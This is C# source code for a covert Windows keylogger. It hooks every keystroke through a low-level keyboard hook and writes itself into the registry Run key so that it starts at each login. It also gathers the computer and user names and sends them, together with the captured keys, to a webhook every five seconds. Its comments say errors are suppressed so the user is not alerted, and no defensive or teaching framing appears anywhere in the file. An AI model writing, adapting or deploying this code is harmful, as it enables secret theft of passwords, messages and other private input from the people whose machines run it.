using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

class Program
{
    private static readonly HttpClient httpClient = new HttpClient();
    private static string webhookUrl;
    private static StringBuilder logBuffer = new StringBuilder();
    private static bool isRunning = true;
    private static readonly object lockObject = new object();
    private static Timer logTimer;

    // Windows API imports
    [DllImport("user32.dll")]
    private static extern bool GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hHook);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP = 0x0105;

    private static LowLevelKeyboardProc keyboardProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    // Delegate for the keyboard hook callback
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    static async Task Main(string[] args)
    {
        // Get webhook URL from command line or use default
        webhookUrl = args.Length > 0 ? args[0] : "YOUR_WEBHOOK_URL_HERE";

        // Add to startup
        AddToStartup();

        // Send PC information
        await SendPCInfo();

        // Register for system events
        SystemEvents.PowerModeChanged += OnPowerModeChanged;

        // Start keylogging
        StartKeyLogging();

        // Run in background
        await Task.Delay(Timeout.Infinite);
    }

    private static void AddToStartup()
    {
        try
        {
            string key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
            {
                string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
                registryKey.SetValue("KeyLogger", assemblyPath);
            }
        }
        catch (Exception ex)
        {
            // Silent failure - we don't want to alert the user
        }
    }

    private static void StartKeyLogging()
    {
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(Process.GetCurrentProcess().MainModule.FileName), 0);
        if (hookId == IntPtr.Zero)
        {
            // Log error silently
            return;
        }

        // Start timer to flush logs periodically
        logTimer = new Timer(FlushLogs, null, 5000, 5000);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP ||
                           wParam == (IntPtr)WM_SYSKEYDOWN || wParam == (IntPtr)WM_SYSKEYUP))
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = GetKeyName(vkCode);

            if (!string.IsNullOrEmpty(key))
            {
                lock (lockObject)
                {
                    logBuffer.Append(key);
                    // Limit buffer size to prevent memory issues
                    if (logBuffer.Length > 10000)
                    {
                        logBuffer.Remove(0, 5000);
                    }
                }
            }
        }

        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    private static string GetKeyName(int vkCode)
    {
        // Special keys
        switch (vkCode)
        {
            case 8: return "[BACKSPACE]";
            case 9: return "[TAB]";
            case 13: return "[ENTER]";
            case 27: return "[ESC]";
            case 32: return " ";
            case 160: case 161: return "[SHIFT]";
            case 162: case 163: return "[CTRL]";
            case 164: case 165: return "[ALT]";
            case 186: return ";";
            case 187: return "=";
            case 188: return ",";
            case 189: return "-";
            case 190: return ".";
            case 191: return "/";
            case 219: return "[";
            case 220: return "\\";
            case 221: return "]";
            case 222: return "'";
            case 112: case 113: case 114: case 115: case 116: case 117: case 118: case 119: case 120: case 121: case 122: case 123:
                return $"[F{vkCode - 111}]";
            case 144: return "[NUMLOCK]";
            case 145: return "[SCROLLLOCK]";
            case 91: case 92: return "[WIN]";
            case 93: return "[MENU]";
            case 12: return "[CLEAR]";
            case 14: return "[PAUSE]";
            case 33: return "[PAGEUP]";
            case 34: return "[PAGEDOWN]";
            case 35: return "[END]";
            case 36: return "[HOME]";
            case 37: return "[LEFT]";
            case 38: return "[UP]";
            case 39: return "[RIGHT]";
            case 40: return "[DOWN]";
            case 45: return "[INSERT]";
            case 46: return "[DELETE]";
            case 173: return "-";
            default:
                // Regular letters
                if (vkCode >= 65 && vkCode <= 90)
                {
                    return ((char)vkCode).ToString();
                }
                // Numbers
                if (vkCode >= 48 && vkCode <= 57)
                {
                    return ((char)vkCode).ToString();
                }
                return "";
        }
    }

    private static async void FlushLogs(object state)
    {
        if (logBuffer.Length == 0) return;

        string logText;
        lock (lockObject)
        {
            logText = logBuffer.ToString();
            logBuffer.Clear();
        }

        if (!string.IsNullOrEmpty(logText))
        {
            await SendToWebhook($"**Key Log:**\n{logText}");
        }
    }

    private static async void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
    {
        string message = "";
        switch (e.Mode)
        {
            case PowerModes.Suspend:
                message = "**PC Suspended**";
                break;
            case PowerModes.Resume:
                message = "**PC Resumed**";
                break;
        }

        if (!string.IsNullOrEmpty(message))
        {
            await SendToWebhook(message);
        }
    }

    private static async Task SendPCInfo()
    {
        try
        {
            var info = new StringBuilder();
            info.AppendLine("**PC Information:**");
            info.AppendLine($"**Computer Name:** {Environment.MachineName}");
            info.AppendLine($"**User Name:** {Environment.UserName}");
            info.AppendLine($"**OS:** {Environment.OSVersion}");
            info.AppendLine($"**Architecture:** {Environment.Is64BitOperatingSystem ? "x64" : "x86"}");
            info.AppendLine($"**Processors:** {Environment.ProcessorCount}");
            info.AppendLine($"**Startup Time:** {DateTime.Now:yyyy-MM-dd HH:mm:ss}");

            await SendToWebhook(info.ToString());
        }
        catch
        {
            // Silent failure
        }
    }

    private static async Task SendToWebhook(string message)
    {
        try
        {
            var payload = new
            {
                content = message,
                username = "KeyLogger",
                avatar_url = "https://cdn-icons-png.flaticon.com/512/1036/1036315.png"
            };

            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            await httpClient.PostAsync(webhookUrl, content);
        }
        catch
        {
            // Silent failure
        }
    }

    // Prevent console window from appearing
    [DllImport("kernel32.dll")]
    static extern bool AllocConsole();

    [DllImport("kernel32.dll")]
    static extern bool FreeConsole();
}